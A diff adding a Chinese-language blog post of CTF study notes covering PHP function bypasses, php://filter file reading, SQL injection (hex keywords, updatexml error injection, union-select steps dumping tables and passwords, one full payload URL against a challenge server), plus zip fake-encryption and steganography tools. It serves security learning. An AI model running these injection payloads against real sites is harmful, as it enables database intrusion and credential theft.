@@ -1,0 +1,306 @@
+---
+layout: "post"
+title: "知识点"
+date: "2019-02-25 20:51"
+---
+
+**二维码** https://cli.im/deqr
+
+# php
+
+### 字符串与数字比较
+
+**bool类型的true跟任意字符串可以弱类型相等**
+
+https://blog.csdn.net/auuuuuuuu/article/details/79621635
+
+![](https://raw.githubusercontent.com/shanke001/-/master/img/20190306174140.png)
+
+![](https://raw.githubusercontent.com/shanke001/-/master/img/20190307212118.png)
+
+# ctf知识点
+
+**MD5('s878926199a')=0e.........等于零**
+
+**php目录扫描 print_f(scandir（'./'）)**
+
+# php 函数漏洞
+
+## 1.变量覆盖 extract（）
+![](https://raw.githubusercontent.com/shanke001/-/master/img/20190226204412.png)
+
+## 2.is_numeric（）
+
+![](https://raw.githubusercontent.com/shanke001/-/master/img/20190226204925.png)
+
+## 3.字符串比较
+
+![](https://raw.githubusercontent.com/shanke001/-/master/img/20190226211540.png)
+
+## 4.in_array
+![](https://raw.githubusercontent.com/shanke001/-/master/img/20190227201615.png)
+
+## 5.ereg()
+
+## 6.strpos
+**返回字符串在另一个字符串中出现的位置**
+
+
+
+
+reg有两个漏洞：
+
+    ①%00截断及遇到%00则默认为字符串的结束
+
+    ②当ntf为数组时它的返回值不是FALSE
+
+## 6.PHP超全局变量
+
+$GLOBALS — 引用全局作用域中可用的全部变量
+
+$GLOBALS 这种全局变量用于在 PHP 脚本中的任意位置访问全局变量（从函数或方法中均可）。
+
+**PHP 在名为 $GLOBALS[index] 的数组中存储了所有全局变量**。变量的名字就是数组的键。
+
+## 7.switch()函数
+![](https://raw.githubusercontent.com/shanke001/-/master/img/20190307212503.png)
+
+## 8. in_array(),array_search()函数
+![](https://raw.githubusercontent.com/shanke001/-/master/img/20190307212722.png)
+
+## 9. is_numeric()函数
+16进制也可以绕过is_numeric()检验，可以用来绕过sql注入里的过滤
+![](https://raw.githubusercontent.com/shanke001/-/master/img/20190307213232.png)
+
+![](https://raw.githubusercontent.com/shanke001/-/master/img/20190307221401.png)
+
+## 10.strcmp函数
+
+strcmp函数不能比较数组类型的数
+
+
+# php伪协议
+
+## php://input
+php://filter/convert.base64-encode/resource
+![](https://raw.githubusercontent.com/shanke001/-/master/img/20190209173918.png)
+
+使用条件：
+
+allow_url_fopen：off/on
+
+allow_url_include：on
+
+## php://filter
+
+**php://filter/convert.base64-encode/resource=**
+取源代码并进行base64编码输出
+php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。
+
+同时我也借此机会学到了文件读取的相关知识。
+
+
+
+  **include “test.php”php文件包含**，在执行流中插入写在其他文件中的有用的代码。读取的时候也是数据流形式，因此可以使用php://filter进行过滤，返回值为0,1。
+
+  **readfile(“test.php”)** 是将文件以数据流的形式读取过来，**并不会执行**，但会在前台浏览器上进行解析。返回值是字节数多少。
+
+
+
+  **file_get_contents(“test.php”)**返回值为文本内容
+
+
+allow_url_fopen：off/on
+
+allow_url_include：off/on
+
+## file
+file://协议
+
+file://协议在双off的情况下也可以正常使用；
+
+allow_url_fopen：off/on
+
+allow_url_include：off/on
+
+file://用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响
+
+
+##  serialize
+
+![](https://raw.githubusercontent.com/shanke001/-/master/img/20190306161132.png)
+
+# $SERVER
+\$SERVER['PHP_SELF']、\$SERVER['SCRIPT_NAME'] 与 \$_SERVER['REQUEST_URI']的区别
+
+![](https://raw.githubusercontent.com/shanke001/-/master/img/20190214192858.png)
+
+
+# php 函数积累
+
+
+* **parse_str（）** 将一个字符串拆成多个变量
+* **eregi字符串对比**
+* **eval可以直接执行php代码**
+
+* **ereg()**函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的
+* **strpos** — 查找字符串首次出现的位置
+* **strcmp**(字符串1，字符串2)
+ ![](https://raw.githubusercontent.com/shanke001/-/master/img/20190306174545.png)
+* **strlen**    判断字符串长度
+![](https://raw.githubusercontent.com/shanke001/-/master/img/20190306174634.png)
+* **extract 变量覆盖**
+总的来说是extract() 函数从数组中将变量导入到当前的符号表，典型的变量覆盖。
+![](https://raw.githubusercontent.com/shanke001/-/master/img/20190306175223.png)
+
+* **intval()**函数会将从字符串的开始进行转换直到遇到一个非数字的字符。
+如果出现无法转换的字符串，intval()不会报错而是返回0。
+
+* **preg_match函数** 返回匹配到的字符
+
+---
+# sql注入
+
+## 绕过技巧
+### 1. 关键字用16进制 0x73656C656374 ...
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+### 2.异或运算
+
+![](https://raw.githubusercontent.com/shanke001/-/master/img/360截图16560308556869.png)
+![](https://raw.githubusercontent.com/shanke001/-/master/img/360截图17150129060957.png)
+**正确为0 错误为1**
+1  ^ 0 = 1
+1  ^ 1 = 0
+测试 过滤字符  符号可以用url编码 %23 #
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++
+### 3.基于报错注入
+
+**updataxml**
+**注入语句**
+**updatexml(1,concat(0x7e,(查询语句),0)**
+暴库
+ **updatexml(1,concat(0x7e,(database(),0x7e),1);**
+ ![](https://raw.githubusercontent.com/shanke001/-/master/img/360截图16720328383368.png)
+ ![](https://raw.githubusercontent.com/shanke001/-/master/img/360截图18720115108113142.png)
+之后相同
+例子
+~~~
+http://123.206.87.240:9004/Once_More.php?id=id=%27%20and%20updatexml(1,concat(%27~%27,(select%20database()),%27~%27),1)%23
+~~~
+
+
+**exp**
+
+语句 select exp(~(select * from (查询语句)x))
+![](https://raw.githubusercontent.com/shanke001/-/master/img/360截图174110299697129.png)
+
+
+
+### 4.基于时间的盲注
+
+![](https://raw.githubusercontent.com/shanke001/-/master/img/360截图18750814505679.png)
+
+
+---
+
+ * **union select group_concat(table_name) from information_schema.tables where table_schema=database()**
+简单的把这句话分解
+**group_concat()** 实际上是配合 where 后面的内容，在此处就理解为 将相同的**table_schem**a中的**table_name**合并成一个查询结果
+**information_schema**数据库是MySQL系统自带的数据库
+tables 是 **information_schema**的其中一个表
+**table_schema**和**table_name**是 表中的一个字段
+database（） 是检测当前数据库的函数
+
+*  **1' union select 1,2,3,4 #**
+![](https://raw.githubusercontent.com/shanke001/-/master/img/20190222133800.png)
+
+## 1.判断是否存在注入，注入是字符型还是数字型
+
+## 2.猜解SQL查询语句中的字段数
+order by 1 #
+
+## 3.确定显示的字段顺序
+输入1′ union select 1,2 #
+
+## 4.获取当前数据库
+database() user() version()
+
+**爆数据库**
+**1' union select schema_name from information_schema.schemata where '1' ='1**
+
+## 5.获取数据库中的表
+* 方法一
+**1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #**
+* 方法二
+**union  select  table_name from information_schema.tables where  table_schema=...**
+
+## 6.获取表中的字段名
+**1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #**
+
+**1' union  select  flag from  flag where  '1' ='1'**
+## 7.下载数据
+
+**1'  union select group_concat(),group_concat(password) from users #**
+
+# CSRF
+
+**CSRF，全称Cross-site request forgery，翻译过来就是跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。**
+
+
+# 文件伪加密
+
+![](https://raw.githubusercontent.com/shanke001/-/master/img/20190310204814.png)
+
+* **无加密**
+
+压缩源文件数据区的全局加密应当为00 00
+且压缩源文件目录区的全局方式位标记应当为00 00
+* **假加密**
+
+压缩源文件数据区的全局加密应当为00 00
+且压缩源文件目录区的全局方式位标记应当为09 00
+
+* **真加密**
+
+压缩源文件数据区的全局加密应当为09 00
+且压缩源文件目录区的全局方式位标记应当为09 00
+
+# 解密
+
+## 1.Brainfuck/Ook!
+**.!?+[]-ok**
+
+https://www.splitbrain.org/services/ook
+
+
+# 其他
+## Hosts文件
+Hosts是一个没有扩展名的系统文件，可以用记事本等工具打开，其作用就是将一些常用的网址域名与其对应的IP地址建立一个关联"数据库"，当用户在浏览器中输入一个需要登录的网址时，系统会首先自动从Hosts文件中寻找对应的IP地址，一旦找到，系统会立即打开对应网页，如果没有找到，则系统会再将网址提交DNS域名解析服务器进行IP地址的解析。
+
+## 位运算
+该题还涉及了一个&运算（位运算），使得&左右两端都为真时才成立，由于c语言学的时候没有讲解，自己也是简单的了解了一下，以二进制的形式比较，
+
+![](https://raw.githubusercontent.com/shanke001/-/master/img/20190130195335.png)
+
+# 加密解密
+## rsa
+
+分解两个质因数网址 http://factordb.com/
+
+## 盲水印
+
+命令 ：
+![](https://raw.githubusercontent.com/shanke001/-/master/img/20190320221222.png)
+
+py decode 图片一 图片二  生成图片名称
+
+## 音乐 MP3
+
+MP3Stego_1_1_16
+
+**decode -X -P 密码 解密文件**
+
+放在相同文件夹下 进行解密
+
+##
